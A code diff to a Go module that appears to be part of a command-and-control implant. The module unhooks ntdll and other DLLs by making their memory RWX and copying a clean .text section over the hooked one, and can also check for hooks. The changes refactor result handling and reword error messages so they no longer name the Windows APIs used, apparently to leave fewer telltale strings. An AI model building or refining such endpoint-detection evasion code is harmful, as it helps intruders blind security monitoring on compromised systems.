@@ -85,21 +85,13 @@ type ntdllUnhookArgs struct {
 
 func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	var args ntdllUnhookArgs
 	if task.Params != "" {
 		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error parsing parameters: %v", err)
 		}
 	}
 
@@ -155,18 +147,10 @@ func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
 				sb.WriteString("\n")
 			}
 		}
-		return structs.CommandResult{
-			Output:    sb.String(),
-			Status:    "success",
-			Completed: true,
-		}
+		return successResult(sb.String())
 
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: unhook, check", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: unhook, check", args.Action)
 	}
 }
 
@@ -186,7 +170,7 @@ func unhookDLL(dllName string) (string, error) {
 	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
 	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
 	if dllBase == 0 {
-		return output, fmt.Errorf("GetModuleHandleW(%s) failed — DLL not loaded", dllName)
+		return output, fmt.Errorf("module %s not loaded", dllName)
 	}
 	output += fmt.Sprintf("[*] In-memory base: 0x%X\n", dllBase)
 
@@ -255,7 +239,7 @@ func unhookDLL(dllName string) (string, error) {
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 	if ret == 0 {
-		return output, fmt.Errorf("VirtualProtect (RWX) failed: %v", err)
+		return output, fmt.Errorf("memory protection change (RWX) failed: %v", err)
 	}
 
 	// Step 7: Copy clean .text over hooked .text
@@ -327,7 +311,7 @@ func checkDLLHooks(dllName string) (string, error) {
 	dllNameW, _ := syscall.UTF16PtrFromString(dllName)
 	dllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(dllNameW)))
 	if dllBase == 0 {
-		return output, fmt.Errorf("GetModuleHandleW(%s) failed — DLL not loaded", dllName)
+		return output, fmt.Errorf("module %s not loaded", dllName)
 	}
 
 	// Map clean copy
